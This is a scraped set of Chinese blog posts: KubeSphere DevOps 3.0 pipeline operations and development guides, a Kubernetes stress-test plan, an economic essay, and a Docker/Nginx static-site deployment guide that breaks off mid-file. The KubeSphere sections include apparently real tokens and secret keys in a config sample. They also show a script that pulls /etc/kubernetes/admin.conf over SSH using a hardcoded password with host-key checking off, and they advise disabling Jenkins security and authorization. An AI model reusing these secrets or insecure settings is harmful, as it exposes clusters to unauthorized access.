处理办法是进入 Jenkins 运行的 Pod，将 useSecurity 改为 false，登陆之后改回原来的值。\nuseSecurity 在 /var/jenkins_home/config.xml 中进行配置。\n3.14 Jenkins 找不到用户，LDAP 报错（重置密码） 提示信息类似:\n1 2 org.acegisecurity.userdetails.UsernameNotFoundException: User admin not found in directory. at hudson.security.LDAPSecurityRealm$LDAPUserDetailsService.loadUserByUsername(LDAPSecurityRealm.java:1314) Jenkins 用户来源于 OpenLdap 组件，报错信息的含义是在 OpenLdap 组件中找不到 admin 用户。解决这个问题，需要检查两个地方：OpenLdap 组件是否异常、admin 用户是否在 OpenLdap 中。然后，修复组件，重新创建 admin 用户。\n重建方法从代码 https://github.com/kubesphere/kubesphere/blob/release-3.0/pkg/controller/user/user_controller.go#L537 中可以发现，需要编辑 admin 用户的加密注解。执行命令 kubectl patch users admin --type merge --patch '{\u0026quot;spec\u0026quot;:{\u0026quot;password\u0026quot;:\u0026quot;P@88w0rd\u0026quot;}, \u0026quot;metadata\u0026quot;:{\u0026quot;annotations\u0026quot;:{\u0026quot;iam.kubesphere.io/password-encrypted\u0026quot;:\u0026quot;false\u0026quot;}}}' 将 admin 用户登陆密码重置为默认值，触发同步逻辑。此条命令也可以用于重置密码。\n3.15 流水线创建之后，在页面查看不到 在 3.0.0 中，采用 CRD 对 DevOps 工程和 Pipeline 进行管理，最终同步到 Jenkins 中。流水线创建之后，在页面无法查看到，是没有完成同步。没有完成同步的可能性很多，ks-controller-manager 中的日志将会帮到你。可能是节点之间的网络通信问题，也有可能是 Jenkins 服务发生了异常，需要根据错误日志排查。\n3.16 找不到 Docker 命令 首先得了解 Jenkins 创建 Agent 运行流水线的过程:\nagent 模板中, 需要挂载 docker.socket 文件 运行流水线时, Jenkins 通 label 选中一个 agent Kubernetes 会以 agent 的配置作为模板，创建一个 Pod 执行 docker 时，需要在 container 包裹下执行(否则使用默认容器 jnlp) 如果执行流水线时，提示找不到 Docker 命令，那么可能是使用了 jnlp 容器。请检查步骤 4, 选中一个包含 docker 命令，并挂载了 docker.socket 的容器。\n","description":"","id":275,"section":"post","tags":["博文","KubeSphere","DevOps","Jenkins","运维"],"title":"KubeSphere DevOps 3.0 流水线运维指南","uri":"https://www.chenshaowen.com/blog/the-operation-guide-of-kubesphere-devops-3-0-pipeline.html"},{"content":" KubeSphere DevOps 包含 S2I 和 Pipeline 两部分。在社区中，openshift 提供了一个打包应用的工具 S2I，具体请参考 使用 S2I 构建云原生应用\n。KubeSphere 将其做成了服务，采用 CRD 使用一个单独的 Operator 对其进行管理，功能比较独立。而在 3.0 中 Pipeline 与 KubeShere Core 耦合依然十分紧密，在搭建环境和调试上略显复杂。本篇主要提供开发者维护和二次开发 KubeSphere DevOps 3.0 指引。\n1. DevOps 流水线架构 下图是流水线的整体架构:\n1.1 存储模型 产品概念 Kubernetes 对象 Jenkins 对象 DevOps 工程 DevopsProject 文件夹 流水线 Pipeline 流水线/多分支流水线 凭证 Credential 文件夹下的凭据 1.2 数据流 主要涉及两类，一类是创建类型的操作，另一类是触发类型的操作。\n创建类型的操作，主要包括三种 CRD 类型的创建，DevopsProject、Pipeline、Credential 。用户通过前端，调用 ks-apiserver 接口，创建对应资源存储在 Etcd 中，然后 ks-controller-manager 不断地将这些对象同步到 Jenkins 。\n触发类型的操作，主要是执行、审核流水线等瞬时动作。用户通过前端，调用 ks-apiserver 经过数据转换，直接调用 Jenkins API 。\n2. DevOps 流水线相关的组件 2.1 系统核心组件 ks-apiserver ks-apiserver 是访问服务的 API 入口。在 3.0 中，ks-apigateway、ks-account 被合并到了 ks-apiserver。因此，ks-apiserver 承载了这两个组件的功能。\nks-controller-manager 在 3.0 中，DevOps 依然与 KubeSphere Core 代码紧密耦合，没有运行单独的 Operator 处理相关的 CRD 资源。DevOps 所有 CRD 资源的处理都在 ks-controller-manager 中进行。\n2.2 Jenkins 流水线 ks-jenkins Jenkins 采用的是 Helm 进行安装和维护，相关的配置可以查看 GitHub 上 ks-installer 仓库 。\n其中 Jenkins 镜像使用的是官方的，没有进行任何定制。\nuc-jenkins-update-center uc 是提供给 Jenkins 下载插件的服务。有两方面的原因需要 uc: 一方面是适配离线环境，同时线上官方地址下载慢；另一方面是有自行开发的插件需要集成。\nuc 提供的只是一个 Nginx 下载服务，相关的镜像内容也只是为了存储 Jenkins 插件而已。\n3. 如何搭建流水线的开发环境 3.1 本地安装 Git、Go、Kubebuilder 基础环境 在此不会详细描述，仅以 OS X 为例。\n安装 Git 1 brew install git 查看版本\n1 2 3 git version git version 2.26.2 安装 Golang 1 brew install golang 查看版本\n1 2 3 go version go version go1.14.4 darwin/amd64 安装 Kubebuilder 1 brew install kubebuilder 查看版本\n1 2 3 kubebuilder version Version: version.Version{KubeBuilderVersion:\u0026#34;2.3.0\u0026#34;, KubernetesVendor:\u0026#34;1.16.4\u0026#34;, GitCommit:\u0026#34;800f63a7e41a6a8016d4cb9d583e1705b0812c9d\u0026#34;, BuildDate:\u0026#34;2020-02-28T19:15:41Z\u0026#34;, GoOs:\u0026#34;unknown\u0026#34;, GoArch:\u0026#34;unknown\u0026#34;} 3.2 安装并配置本地访问 安装 Kubernetes 集群 推荐安装工具 Kubekey。现在主流的集群安装工具是基于 Kubeadm 的二次封装。Kubekey 的优势是国内安装快，配置简单。使用 Kubeadm 半小时的工作量，Kubekey 两分钟解决，还集成了不少插件。这也符合我提倡的，技能文档化，文档工具化，工具产品化，产品服务化 的想法。\n在安装时，需要注意一个参数。\n1 2 controlPlaneEndpoint: domain: k2 由于 kube-apiserver 采用的是 https 通信，这里的 domain 会被设置到 certSANs 中生成证书。通过 certSANs 中地址进行地访问才是合法的。\n开发环境配置 hosts 完成安装 Kubernetes 集群之后，在开发环境配置 hosts ，即可直接通过 domain 进行远程访问 kube-apiserver 。下面是我本地的 /etc/hosts 配置，一共有三个集群:\n1 2 3 4 5 cat /etc/hosts 139.198.x.x k1 139.198.x.x k2 139.198.x.x k3 开发环境配置 kubeconfig 简单一点，可以直接拷贝服务器的文件到本地保存。这里提供一份脚本，可以快速切换多个环境。注意，替换 your_password 为你的远程登陆密码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 # Switch K8s function on_k8s() { if test -f ~/.kube/config.bk; then rm -rf ~/.kube/config.bk fi if test -f ~/.kube/config; then mv ~/.kube/config ~/.kube/config.bk fi sed -i\u0026#39;.s\u0026#39; -e \u0026#39;/$1/d\u0026#39; ~/.ssh/known_hosts sshpass -p \u0026#34;your_password\u0026#34; ssh -o StrictHostKeyChecking=no root@$1 \u0026#34;cat /etc/kubernetes/admin.conf\u0026#34; \u0026gt; ~/.kube/config sed -i\u0026#39;.s\u0026#39; -E \u0026#39;s/([0-9]{1,3}\\.){3}[0-9]{1,3}\u0026#39;/$1/ ~/.kube/config sed -i\u0026#39;.s\u0026#39; -E \u0026#39;s/kubernetes-admin@cluster.local\u0026#39;/$1/ ~/.kube/config } 使用时，执行 on_k8s k1 切换到 k1 环境，执行 on_k8s k2 切换到 k2 环境。\n验证配置是否成功 1 2 3 4 5 6 7 8 9 10 # 切换环境 on_k8s k2 # 执行 kubectl 命令 kubectl get node NAME STATUS ROLES AGE VERSION master Ready master 54d v1.17.9 node1 Ready worker 54d v1.17.9 node2 Ready worker 54d v1.17.9 3.3 克隆 KubeSphere 仓库代码 star \u0026amp; fork GitHub 项目 kubesphere/kubesphere 。Git 的提交流程可以参考文档: 一个完整的 Git 提交流程 。\n克隆代码 1 git clone https://github.com/shaowenchen/kubesphere 进入项目目录 1 cd kubesphere 3.4 配置 Webhook 证书 执行如下命令，在 $TMPDIR 目录下生成证书。\n1 2 3 4 5 mkdir -p .keys \u0026amp;\u0026amp; openssl req -nodes -new -x509 -keyout ./.keys/ca.key -out ./.keys/ca.crt -subj \u0026#34;/CN=cronprimer CA\u0026#34; openssl genrsa -out ./.keys/tls.key 2048 openssl req -new -key ./.keys/tls.key -subj \u0026#34;/CN=webhook-server.webhook.svc\u0026#34; | openssl x509 -req -CA ./.keys/ca.crt -CAkey ./.keys/ca.key -CAcreateserial -out ./.keys/tls.crt mkdir -p $TMPDIR/k8s-webhook-server/serving-certs cp ./.keys/* $TMPDIR/k8s-webhook-server/serving-certs/ 1 2 3 4 5 6 7 8 9 10 11 tree $TMPDIR/k8s-webhook-server /Users/shaowenchen/Temp/k8s-webhook-server └── serving-certs ├── ca.crt ├── ca.key ├── ca.srl ├── tls.crt └── tls.key 1 directory, 5 files 3.5 配置 kubesphere.yaml 在项目根目录下，新增 kubesphere.yaml 文件。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 kubernetes: kubeconfig: \u0026#34;/Users/shaowenchen/.kube/config\u0026#34; master: k2:6443 qps: 1e+06 burst: 1000000 devops: host: http://k2:30180/ username: admin password: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGt1YmVzcGhlcmUuaW8iLCJ1c2VybmFtZSI6ImFkbWluIiwidG9rZW5fdHlwZSI6InN0YXRpY190b2tlbiJ9.eoVAs9uWPi54YTknQ4NaaomVdq3q-THsZMOb4TwChU4 maxConnections: 100 sonarQube: host: http://k2:30594 token: cfa96640569d9ce3b6f84ae287bcc1a970973958 s3: endpoint: http://k2:9001 region: us-east-1 disableSSL: true forcePathStyle: true accessKeyID: openpitrixminioaccesskey secretAccessKey: openpitrixminiosecretkey bucket: s2i-binaries authentication: authenticateRateLimiterMaxTries: 10 authenticateRateLimiterDuration: 10m0s loginHistoryRetentionPeriod: 168h maximumClockSkew: 10s multipleLogin: true kubectlImage: kubesphere/kubectl:v1.0.0 jwtSecret: \u0026#34;2b0WJPoacvbvMB82bTEWO4s4vFlmzoPd\u0026#34; oauthOptions: accessTokenMaxAge: 0 AccessTokenInactivityTimeout: 0 authorization: mode: \u0026#34;RBAC\u0026#34; # mode: \u0026#34;AlwaysAllow\u0026#34; monitoring: endpoint: FAKE ldap: host: FAKE redis: host: FAKE 这里我直接使用远程环境的访问地址，比使用 telepresence 通过集群服务地址访问效率更高。kubesphere.yaml 中相关的配置值，可以从 kubectl get cm kubesphere-config -n kubesphere-system -o yaml 的输出中获取，粘贴到开发环境中即可。\n值得注意的是 3.0 中，采用外置的 Sonarqube ，因此，需要根据官方文档进行单独配置。kubeconfig 字段指向的是开发环境 kubeconfig 文件地址，而线上使用的是 serviceaccount 。S2I 依赖于 S3 服务存储二进制文件，流水线不需要 S3。\n3.6 本地运行测试服务 运行 ks-apiserver 1 go run cmd/ks-apiserver/apiserver.go --logtostderr=true --v=8 --debug=true 服务启动之后，会打印 Start listening on :9090 表示，ks-apiserver 监听在 9090 端口，可以访问。\n通过 Postman 进行访问时，需要带上集群前端的 Token，也可以使用 kubesphere-config 中的永久 Token，还可以将 mode 改为 AlwaysAllow 关掉鉴权。\n在 Postman 中，可以设置一下变量，通过 {{ VAR_NAME }} 的形式可以引用，十分方便。下面有两类 API 的调用示例：\n一种是 CRD 资源的增删改查，带上 Token 即可。\n另一种是透传 Jenkins API ，不仅需要带上 Token，还需要带上 Jenkins Crumb 。这些参数通过页面访问时，在 Cookies 中都可以拿到。\n运行 ks-controller-manager 为了避免干扰，需要先暂停集群中的 ks-controller-manager 。\n1 kubectl scale deploy ks-controller-manager --replicas=0 -n kubesphere-system 运行本地的 ks-controller-manager\n1 go run cmd/controller-manager/controller-manager.go --logtostderr=true --v=8 --multiple-clusters=false 4. 如何发布到集群环境 建议将相关服务的 imagePullPolicy 改为 Always ，确保每次使用的都是最新的镜像。\n4.1 更新插件 建立如下目录结构：\n1 2 3 4 5 6 tree -L 1 . |-- Dockerfile `-- webroot 1 directory, 2 files Dockerfile 内容\nFROM busybox:1.29.3 COPY webroot/ /webroot/ webroot 中的内容，可以先运行 docker run -it -d kubesphere/jenkins-uc:v3.0.0 获取到容器 ID ，然后使用 docker cp {UC_ContainerID}:/webroot ./ 命令拷贝插件，自由替换、增删其中的离线插件。\n最后使用 docker build . -t shaowenchen/jenkins-uc:latest 命令打包，推送镜像。然后执行命令 kubectl -n kubesphere-devops-system edit deploy uc-jenkins-update-center ，修改 uc 的服务镜像为 shaowenchen/jenkins-uc:latest ，重启 deploy 即可。\n这里需要注意的是 Jenkins 只有在首次初始化时，访问 uc 获取插件。初始化插件列表在 kubectl -n kubesphere-devops-system get cm ks-jenkins -o yaml 中可以查看。\n4.2 更新 ks-apiserver 或 ks-controller-manger 编译 ks-apiserver 1 make ks-apiserver 编译并推送 ks-apiserver 镜像 docker build -f build/ks-apiserver/Dockerfile -t shaowenchen/ks-apiserver:latest . docker push shaowenchen/ks-apiserver:latest 更新 ks-apiserver 服务 执行命令，更新镜像为 shaowenchen/ks-apiserver:latest 即可。\n1 kubectl -n kubesphere-system edit deploy ks-apiserver 编译 ks-controller-manager 1 make controller-manager 编译并推送 ks-controller-manager 镜像 docker build -f build/ks-controller-manager/Dockerfile -t shaowenchen/ks-controller-manager:latest . docker push shaowenchen/ks-controller-manager:latest 更新 ks-controller-manger 服务 执行命令，更新镜像为 shaowenchen/ks-controller-manager:latest 即可。\n1 kubectl -n kubesphere-system edit deploy ks-controller-manager 5. 关于鉴权插件 kubesphere-token-auth-plugin 插件主要是为了集成 KubeSphere 的权限体系，使 Jenkins 与之保持一致。如下图，无论是 CRD 资源类型，还是触发动作类型，在调用 Jenkins 时，都需要经过 ks-apiserver 进行 token 的 review。\n在 KubeSphere 中 Token 是 bearer 类型，但是插件是基于 Basic 鉴权进行的扩展，所以需要转换。代码如下：\nhttps://github.com/kubesphere/kubesphere/blob/release-3.0/pkg/simple/client/devops/jenkins/request.go#L47:6\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 func SetBasicBearTokenHeader(header *http.Header) error { bearTokenArray := strings.Split(header.Get(\u0026#34;Authorization\u0026#34;), \u0026#34; \u0026#34;) bearFlag := bearTokenArray[0] var err error if strings.ToLower(bearFlag) == \u0026#34;bearer\u0026#34; { bearToken := bearTokenArray[1] if err != nil { return err } claim := authtoken.Claims{} parser := jwt.Parser{} _, _, err = parser.ParseUnverified(bearToken, \u0026amp;claim) if err != nil { return err } creds := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(\u0026#34;%s:%s\u0026#34;, claim.Username, bearToken))) header.Set(\u0026#34;Authorization\u0026#34;, fmt.Sprintf(\u0026#34;Basic %s\u0026#34;, creds)) } return nil } 插件中的逻辑主要是，调用 ks-apiserver 鉴权接口，返回合法用户。\n6. 后端代码结构及逻辑 6.1 代码目录 代码路径以 https://github.com/kubesphere/kubesphere/tree/release-3.0 为例。\npkg/apiserver/apiserver.go 通过 ks-apiserver 对外提供的接口，都需要在这里进行注册，配置 GVR 等。\npkg/kapis/devops KubeSphere 以 /kapis 为前缀提供 API， 在这里还需要对每个 URL 进行更详细的描述和处理，通常会调用到很多 models 中的函数方法。API 文档也是在这里进行描述的。\npkg/models/devops 对于数据层的操作，被聚合在 models 中。这里提供了很多对数据的操作方法。\npkg/controller/devopscredential credential 的 controller 处理部分。\npkg/controller/devopsproject devopsproject 的 controller 处理部分。\npkg/controller/pipeline pipeline 的 controller 处理部分。\npkg/simple/client/devops 上面的代码理解起来相对容易，这部分会有些难度。这里的主要功能是提供对 Jenkins 的操作函数方法。在实现时，抽象了一个 Interface ，希望能够对接不同的编排工具。\n简单说了下代码目录，可能还是不够清晰。下面一起通过调用逻辑看看代码。\n6.2 关于 CRD 类型的代码逻辑 以创建 DevOps 工程为例。\n前端调用 /kapis/devops.kubesphere.io/v1alpha3/workspaces/liuxin-test/devops/ ，传递参数\n后端处理 https://github.com/kubesphere/kubesphere/blob/release-3.0/pkg/kapis/devops/v1alpha3/register.go#L154 ，通过生成的 client 写入 Etcd\nks-controller-manager 处理 https://github.com/kubesphere/kubesphere/blob/release-3.0/pkg/controller/devopsproject/devopsproject_controller.go#L205 ，这里单步运行，可以缕清整个链路。最终是调用 pkg/simple/client/devops 中的接口，在 Jenkins 中，创建一个文件夹。\n6.3 关于触发类型的代码逻辑 以触发代码扫描为例。\n前端调用 kapis/devops.kubesphere.io/v1alpha2/devops/test2-projectwvb2n/pipelines/test1-pipeline/scan/ ， 传递参数\n后端处理 https://github.com/kubesphere/kubesphere/blob/release-3.0/pkg/kapis/devops/v1alpha2/register.go#L479 ，这是就不需要经过 ks-controller-manager，单步运行调试会发现，依然会进入 pkg/simple/client/devops 然后组装 xml 调用 Jenkins API 。\n7. 前端代码结构和逻辑 前端的代码结构清晰，非常直观，文件名能与页面对应上。下面以仓库地址 https://github.com/kubesphere/console/tree/release-3.0 为例进行说明。另外，前端采用的是 React 框架。\n7.1 代码目录 主要的逻辑都在 src/pages/devops 目录。\ncomponents 流水线相关的组件。而 src/components 中是整个项目公共的组件。\ncontainers 对应流水线相关的页面。如下图，左侧选项卡与文件夹中文件名一一对应，包括流水线图形化编辑页面。\nroutes 单页面应用的路由配置。\n7.2 环境搭建 请参考 https://github.com/kubesphere/console 的文档。\n","description":"","id":276,"section":"post","tags":["博文","KubeSphere","DevOps","Jenkins","开发环境"],"title":"KubeSphere DevOps 3.0 流水线开发指南","uri":"https://www.chenshaowen.com/blog/the-development-guide-of-kubesphere-devops-3-0-pipeline.html"},{"content":"1. 重剑出鞘问天下 自 1840 开始，中国经历了百余年的屈辱；而自 1978 开始，中国只花了四十余年就从一个贫弱的大国变成一个富足的强国。\n这是民族坚韧与智慧的体现。悠久的文化历史，提供给人们足够的养分。在微观上，人们可以找到各自人生的归处；在宏观上，推动着国家和民族的发展。\n中华民族的崛起已然成势。在崛起之势向前推进的过程中，任何小的磕磕绊绊都不会影响巨轮的方向。但一国之崛起，必然会使得世界格局发生变化，利益重新分配。这也会是未来十年，争夺的焦点。\nCOVID-19 新冠肺炎只是激发了潜在的情绪和竞争，风险从来都不曾解除。我相信，在未来十年，很多国家之间都会有各种各样的冲突，但也会重新建立起合作。推翻旧的合作框架，构建新的利益共同体。\n如上图，在 wikipedia 上可以看到近几十年，全球很多地方都有过武装冲突，死了很多人。习惯和平发展的中国，也会逐步融入动乱的世界，并在其中扮演自己的角色。\n2. 经济技术两重天 中华民族是极具智慧的民族，再一次得到验证。一旦摸清了规则，就能迅速处于领导地位。关于经济增长相关的实证研究非常多，这里就不粘贴复制。下面是我在 WolframAlpha 查询到的 GDP 数据:\n数据截止到 2018，近两年增速开始放缓。中国的 GDP 绝对值已经很大，每年 10% 左右的增长不可持续，曲线钝化是必然。\n在过去的几十年里，经济的增长得益于改革开放。中国市场足够大，适龄劳动人口足够多，只要松开束缚让大家去干，总能找到点赚钱的门路。能吃苦、胆子大，造就了一批又一批先富起来的人。\n随着市场真空逐步被填满，我们迎来的是存量博弈时代。存量竞争最重要的是资本和技术。以我所在的互联网行业来说，腾讯不喜欢控股，擅长持股合作，涉足了大半个互联网版图，而另一半是阿里巴巴的。阿里巴巴喜欢控股，看好的公司就买下来，买不来就自己做。中国互联网的基础环境由他们构成，任何互联网活动都很难完全摆脱这两家公司，他们处于资本和技术的垄断地位。\n最近云栖大会上，阿里巴巴推出了云电脑和物流机器人。我在想，不是已经有很多公司在做了吗？阿里巴巴这么有实力，为什么不做些更有意义的事？或许他们有很多自己的考量，公司大了之后就会有很多问题，也会对整个行业生态产生不利的影响。\n现在是技术高质量发展的前夕。在政府网站上的数据显示，2018年，亚洲受理的专利申请量占世界总量的三分之二，仅中国就占了世界专利申请量近一半。一旦摸清规则，就能迅速处于领导地位。但中国申请的专利质量并不高，专利收入也很低，主要都是为充数量的非核心专利。在技术从模仿走向原创的过程中，量也是很重要的。围绕产品，充分了解之后，才有可能迸发原创的思想。\n大公司们不遗余力地推出各式各样的产品，占领各种各样的大小市场。以前可能只是选择头部细分领域，现在是加上长尾，全量推进。只能说，钱变得难赚了，未来还会更难。大公司通过产品，不断地收集用户的喜好，行为数据，打磨产品。小公司，技术含量又不高，本身也没有很高的护城河，越发难以生存。\n3. 辞旧迎新有机遇 中国的反垄断法一直没有真正发挥作用，而现在恰逢激烈的国际竞争，更不可能打压国内巨头。指望一鲸落而万物生，恐怕是不可能的。\n技术是服务市场的。互联网技术能做的是降低人们触达的成本，增加人与人之间的连接。在此网络之上，传输的就是市场服务。以前风险很高的决策，现在可以快速验证；以前收益很低的产品，现在可以走量。互联网正在改变现有的商业模式。\n不要认为已经变化到头。不能将我们习以为常的互联网技术，看作是世人皆知的普惠技术。中国中低收入及以下人群有 6 亿，依然具有很大的发展空间。很多中小公司，对互联网技术还十分渴求。\n技术服务实际上是一个降级的过程。将我们擅长的技术，屏蔽掉复杂性，提供简单、便捷的使用方式给客户。这也是很多 ToB 公司正在做的。\n除了技术，思考方式也是很好的输出。建筑行业具有几千年的发展历史，相较于传统行业，互联网行业是一个很年轻的行业。但互联网行业形成了一套自己的研发理论和商业逻辑，这是可以提供给其他行业参考和借鉴的。毕竟，福布斯上，互联网已经超过地产，成为第一行业。成功的一方，总结出来的经验，才会有人愿意听。\n年轻人也在改变。物质富足，年轻人开始追求小而美的生活，追求自我的释放和实现。他们的消费观念和生活方式，都和老一辈人不同。这种差异会带来很大市场波动，适应的公司市场份额会急速增长，没有及时调整策略的公司将被迅速淘汰。咨询行业会得到进一步的发展。\n这么一个急剧变化，而充满机会的时代真好。\n","description":"","id":277,"section":"post","tags":["博文","变化","经济","思考"],"title":"巨变与机遇的未来十年","uri":"https://www.chenshaowen.com/blog/great-changes-and-opportunities-in-the-next-decade.html"},{"content":" Kubernetes 平台管理软件运行在 Kubernetes ，用于管理运行在 Kubernetes 上的资源对象。\n1. 测试思路 测试在一定负载一定集群规模下，平台软件的管理能力，而不是 Kubernetes 的管理能力。平台软件的管理能力主要体现在能通过 UI 对负载、PV 进行增删改查，在 UI 上能够直接查看负载的监控和日志。\n明确测试内容和目的非常重要。测试对象不是 Kubernetes 。Kubernetes 相关的测试，社区会给出更好的答案。这里需要测试的是平台软件对 Kubernetes 资源对象的管理能力。\n2. 测试组合 根据 Kubernetes 社区的建议：\n节点数不超过 5000 Pod 总数不超过 150000 容器总数不超过 300000 每个节点的 pod 数量不超过 100 所有的测试内容，需要在相关组件的推荐配置下进行。既然上游有推荐，那么下游遵循就可以，有问题再提交给上游。\n2.1 负载率 使用较多的一组序列是 50%、90%、99% 。也就是将 Kubernetes 集群的负载水位控制在 50%、90%、99% ，然后再对相关指标进行测试。\n负载类型也是一个需要思考的地方。被社区广泛使用、认可的负载是最佳的选择，但是在压力测试方面，还没有达成测试负载共识，认可某一个负载的测试结果。\n这里主要推荐使用的是 Kubernetes 社区提供的 examples :\nWordPress with MySQL -\thttps://github.com/kubernetes/examples Go app with Redis\t- https://github.com/kubernetes/examples Java shopping - https://github.com/danielbryantuk/oreilly-docker-java-shopping/tree/master/kubernetes Nginx - https://github.com/kubernetes/examples/blob/master/staging/pod 这些负载基本能够覆盖常用的类型，而且与同类产品也更容易进行对比。\n2.2 节点数量 根据 Kubernetes 官方提供的大集群最佳实践，将集群规模分为六等：\n节点数\\负载率 50% 90% 99% 5 (n1-standard-1) 10 (n1-standard-2) 100 (n1-standard-4) 250 (n1-standard-8) 500 (n1-standard-16) 多于 500 (n1-standard-32) 在 Google Cloud 中可以查询到机器具体配置如下:\n机器名称 vCPU 内存（GB） 是否 SSD n1-standard-1 1 3.75 是 n1-standard-2 2 7.50 是 n1-standard-4 4 15 是 n1-standard-8 8 30 是 n1-standard-16 16 60 是 n1-standard-32 32 120 是 2.3 Etcd 配置 对于大规模 Kubernetes 集群，Etcd 的配置显得十分重要。因为全部节点的 Kubelet 都需要连接 Etcd ，节点增加会对 Etcd 产生最直接的压力。\n根据 Etcd 社区的推荐配置，根据节点数，配置 Etcd 即可。\n节点数 数据大小 vCPUs 内存 (GB) Max concurrent IOPS Disk bandwidth (MB/s) 50 no more than 100 MB 2 8 3600 56.25 250 no more than 500 MB 4 16 6000 93.75 1000 no more than 1 GB 8 32 8000 125 3000 more than 1 GB 16 64 16,000 250 Etcd 的节点数量维持在 3、5、7 个即可，不是越多越好，节点多写数据慢。具体可以参考: Etcd、Etcdctl 应用实践 。\n2.4 测试设备和费用 进行大规模 Kubernetes 集群压力测试，资金开销肯定不会少。\n如果有足够的物理机资源，可以使用物理机安装 IaaS 软件，基于 VM 进行测试。通常 IaaS 云厂商的 2 个 vCPU 对应一个物理 CPU ，而内存是 1：1 进行售卖。在虚拟化的过程中，需要保证物理资源具有一定冗余，否则测试结果可能不具备参考意义。\n如果没有足够的物理机，那么只能够借助于云服务器了。使用 Terraform 等编排工具，是一个不错的选择，可以用于快速创建资源。测试完成之后，又可以快速销毁，能够减少部分资金开销。可以参考: 如何使用 Terraform Provider 提供 Iac 级别的应用 。\n3. 测试输出 能够管理 Node 的最大数量 能够管理 Workload 的最大数量 能够管理 PV 的最大数量 能够承受的最大日志量（频次、大小，与 Node 数量相关） 能够承受的最大的监控量（与 Node 数量相关） 各个梯度下的推荐配置 各个梯度下的管理能力 各个梯度负载下，平台管理软件的容错恢复能力（HA） 4. 测试维度 4.1 功能点 UI 页面 查询负载 管理负载/PV 查询/检索日志 查看监控 \u0026hellip;(核心功能) 4.2 观察指标 呈现（是否能打开相关功能） 速度 （2 秒以内，超过 10 秒算失败） 准确度（操作是否正常，返回数据是否正常） 高可用（HA) 5. 参考 https://kubernetes.io/docs/setup/best-practices/cluster-large/ https://cloud.google.com/compute/docs/machine-types https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/hardware.md ","description":"","id":278,"section":"post","tags":["博文","Kubernetes","压力测试","方案","Etcd","负载"],"title":"Kubernetes 平台管理软件压力测试方案","uri":"https://www.chenshaowen.com/blog/stress-testing-plan-of-kubernetes-platform-management-software.html"},{"content":"联系方式 邮箱：mail(at)chenshaowen.com\n微信号 关注我的微信公众号，可以获取我的微信号。\n免费咨询 请发送邮件或者加微信后留言，避免过多寒暄，直接给出问题，我一般都会回复，但通常并不会非常即时。\n付费咨询 200 RMB/0.5 小时，限一个大类方向的问题。先付费，后提供即时咨询。\n","description":"","id":279,"section":"","tags":null,"title":"关于","uri":"https://www.chenshaowen.com/about.html"},{"content":"1. 为什么采用镜像独立部署 更好的 SEO 使用 Github Pages ，部署静态网站非常方便。一次配置，每次提交都可以自动部署更新。再加上 jsDelivr、Cloudflare 加速，在免费方案中，已经生产可用。\n无奈的是，百度搜索引擎对 Github Pages 网站，收录极慢，甚至不收录。即使利用 Cloudflare 缓存，而 Cloudflare 与百度有合作；主动提交 sitemap ；每个页面都添加了 push 脚本，依然没有效果。Google、Bing 的收录量好很多，是百度的 4-5 倍。另一种方案是，采用 DNS 多线路解析，给百度爬虫一个专用的 IP 进行 SEO 优化，但是这样又得多部署一套服务。\n采用独立主机部署对 SEO 更友好。\n更贴近云原生 物理机上，搭建环境的脚本兼容性差，服务也不易维护。云原生时代，当然首选容器，只需要将服务打包成镜像即可。\n打包镜像的过程可以直接配置在 CI 中自动完成，而部署过程只是管理一个容器。\n好用、易维护，这就是云原生。\n2. 打包静态文件服务 Hexo、Jekyll、Hugo 这些静态页面框架，都是通过将 Markdown 渲染生成 Html 对外提供内容服务。在部署时，只需要一个 Nginx 转发静态文件。\n2.1 添加 Dockerfile 文件 在项目的根目录添加文件 Dockerfile ，内容如下:\n1 2 3 4 5 6 7 8 9 10 11 FROM node:10 as builder RUN npm install -g cnpm --registry=https://registry.npm.taobao.org \u0026amp;\u0026amp; \\ cnpm i -g hexo-cli ADD ./ /home WORKDIR /home RUN cnpm i \u0026amp;\u0026amp; hexo g FROM nginx:1.19 ADD ./conf/nginx/default.conf /etc/nginx/conf.d/ ADD ./conf/cert/* /etc/nginx/certs/ COPY --from=0 /home/public /var/www/ 通过分阶段构建，可以有效减小镜像的大小。其中 ADD 指令的文件内容，下面会具体说明。\n2.2 添加 Nginx 配置文件 在项目下添加如下三个文件:\n1 2 3 4 5 6 7 8 9 tree -L 2 conf conf ├── cert │ ├── 1_www.chenshaowen.com_bundle.crt │ └── 2_www.chenshaowen.com.key └── nginx └── default.conf 2 directories, 3 files 其中 conf/nginx/default.conf 文件内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 server { listen 80; server_name chenshaowen.com www.chenshaowen.com; server_tokens off; location / { return 301 https://$host$request_uri; } } server { listen 443 ssl; server_name chenshaowen.com www.chenshaowen.com; server_tokens off; ssl_certificate /etc/nginx/certs/1_www.chenshaowen.com_bundle.crt; ssl_certificate_key /etc/nginx/certs/2_www.chenshaowen.com.key; location / { root /var/www; index index.html; } error_page 404 /404.html; } 这里将 Http 服务转发到 Https，将裸域名的访问转发到 www。\n而 .crt 和 .key 文件是域名的证书文件，很多云厂商都提供了免费的 Https 证书。这里推荐腾讯云的免费 Https 证书，验证简单、签发速度快，还提供下载。\n3. Github Actions 自动编译镜像 3.1 新增 Makefile 文件 内容如下:\n1 2 3 4 5 6 7 8 9 10 11 build: docker build -f Dockerfile -t ghcr.io/shaowenchen/documents:latest . install: yum install -y yum-utils yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo yum install -y docker-ce-19.03.8-3.el7 systemctl start docker systemctl enable docker yum install -y python3-pip pip3 install docker-compose Makeffile 中定义了两个指令，build 用于构建镜像，而 install 用于在物理机上安装 Docker 运行环境。\n3.2 定义 CI 编译推送流程 在项目的根目录增加文件 .github/workflows/build.yaml ，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 name: build on: [push] jobs: build: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v2 - name: Build image run: make build - name: Login Registry uses: docker/login-action@v1 with: registry: 